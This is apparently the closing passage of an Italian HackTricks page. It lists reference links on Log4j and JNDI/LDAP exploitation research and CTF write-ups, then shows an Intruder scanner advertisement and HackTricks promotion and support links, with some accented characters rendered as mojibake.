* [https://www.youtube.com/watch?v=XG14EstTgQ4](https://www.youtube.com/watch?v=XG14EstTgQ4)
* [https://tryhackme.com/room/solar](https://tryhackme.com/room/solar)
* [https://www.youtube.com/watch?v=Y8a5nB-vy78](https://www.youtube.com/watch?v=Y8a5nB-vy78)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)
* [https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/)
* [https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Trova le vulnerabilit√† che contano di pi√π in modo da poterle correggere pi√π velocemente. Intruder monitora la tua superficie di attacco, esegue scansioni proattive delle minacce, trova problemi in tutta la tua infrastruttura tecnologica, dalle API alle applicazioni web e ai sistemi cloud. [**Provalo gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) oggi stesso.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**repository di HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
